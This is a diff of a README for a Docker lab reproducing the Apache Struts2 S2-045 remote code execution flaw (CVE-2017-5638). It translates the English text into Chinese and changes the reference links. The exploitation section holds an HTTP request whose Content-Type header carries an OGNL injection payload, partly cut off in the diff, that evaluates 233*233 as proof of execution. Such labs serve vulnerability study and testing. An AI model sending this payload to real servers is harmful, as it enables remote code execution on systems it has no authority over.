@@ -1,27 +1,26 @@
-# S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）
+# S2-045 远程代码执行漏洞（CVE-2017-5638）
 
-[中文版本(Chinese version)](README.zh-cn.md)
+影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
 
-Affected Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
-
-References: 
+漏洞详情: 
 
  - http://struts.apache.org/docs/s2-045.html
- - https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/
+ - https://blog.csdn.net/u011721501/article/details/60768657
+ - https://paper.seebug.org/247/
 
-## Setup
+## 漏洞环境
 
-Execute the following command to start the Struts2 2.3.30：
+执行如下命令启动struts2 2.3.30：
 
 ```
 docker-compose up -d
 ```
 
-After the container is running, visit `http://your-ip:8080` that you can see an example of the upload page.
+环境启动后，访问`http://your-ip:8080`即可看到上传页面。
 
-## Exploitation
+## 漏洞复现
 
-Verify the vulnerability by following request:
+直接发送如下数据包，可见`233*233`已成功执行：
 
 ```
 POST / HTTP/1.1
@@ -36,7 +35,5 @@ Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse
 
 
 ```
-
-`233*233` has been successfully executed:
 
 ![](1.png)
